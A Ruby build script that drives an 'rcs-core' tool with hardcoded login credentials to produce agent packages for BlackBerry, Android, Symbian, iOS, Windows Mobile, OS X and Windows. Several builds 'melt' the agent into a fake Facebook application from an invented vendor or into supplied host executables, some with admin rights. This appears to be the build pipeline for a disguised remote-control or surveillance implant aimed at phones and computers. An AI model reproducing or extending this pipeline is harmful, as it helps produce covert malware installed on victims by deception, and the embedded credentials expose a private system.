#!/usr/bin/env ruby
require 'json'
require 'fileutils'

USER = 'alor'
PASS = 'demorcss'
FACTORY = 'RCS_0000000001'
DB = 'rcs-castore'
PORT = 443
DEMO = true

ver = DEMO ? '_demo' : ''

puts "Building all platforms..."
###################################################################################################
params = {platform: 'blackberry',
          binary: {demo: DEMO},
          melt: {appname: 'facebook',
                 name: 'Facebook Application',
                 desc: 'Applicazione utilissima di social network',
                 vendor: 'face inc',
                 version: '1.2.3'},
          package: {type: 'local'}
          }

FileUtils.rm_rf("blackberry_local#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o blackberry_local#{ver}.zip" or raise("Failed")
params[:package][:type] = 'remote'
FileUtils.rm_rf("blackberry_remote#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o blackberry_remote#{ver}.zip" or raise("Failed")

###################################################################################################
###################################################################################################
params = {platform: 'android',
          binary: {demo: DEMO},
          melt: {appname: 'facebook'}
          }

FileUtils.rm_rf("android#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o android#{ver}.zip" or raise("Failed")

###################################################################################################
###################################################################################################
params = {platform: 'symbian',
          binary: {demo: DEMO},
          melt: {appname: 'facebook'},
          sign: {edition: '5th3rd'},
          }

FileUtils.rm_rf("symbian#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -C symbian.cer -o symbian#{ver}.zip" or raise("Failed")

###################################################################################################
###################################################################################################
params = {platform: 'ios',
          binary: {demo: DEMO}
          }

FileUtils.rm_rf("ios#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o ios#{ver}.zip" or raise("Failed")

###################################################################################################
###################################################################################################
#if RUBY_PLATFORM =~ /mingw/
  params = {platform: 'winmo',
            binary: {demo: DEMO},
            melt: {appname: 'facebook'},
            package: {type: 'local'}
            }
  FileUtils.rm_rf("winmo_local#{ver}.zip")
  File.open('build.json', 'w') {|f| f.write params.to_json}
  system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o winmo_local#{ver}.zip" or raise("Failed")
  params[:package][:type] = 'remote'
  FileUtils.rm_rf("winmo_remote#{ver}.zip")
  File.open('build.json', 'w') {|f| f.write params.to_json}
  system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o winmo_remote#{ver}.zip" or raise("Failed")
#end
###################################################################################################
###################################################################################################
params = {platform: 'osx',
          binary: {demo: DEMO, admin: true}
          }

FileUtils.rm_rf("osx_default#{ver}.zip")
FileUtils.rm_rf("osx_melted#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o osx_default#{ver}.zip" or raise("Failed")
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted#{ver}.zip" or raise("Failed")

###################################################################################################
###################################################################################################
#if RUBY_PLATFORM =~ /mingw/
params = {platform: 'windows',
          binary: {demo: DEMO},
          melt: {admin: true}
          }

FileUtils.rm_rf("windows_default#{ver}.zip")
FileUtils.rm_rf("windows_melted#{ver}.zip")
FileUtils.rm_rf("windows_cooked#{ver}.zip")
File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o windows_default#{ver}.zip" or raise("Failed")
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -i windows_app.exe -o windows_melted#{ver}.zip" or raise("Failed")
params[:melt][:cooked] = true
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o windows_cooked#{ver}.zip" or raise("Failed")
#end
###################################################################################################
puts "End"
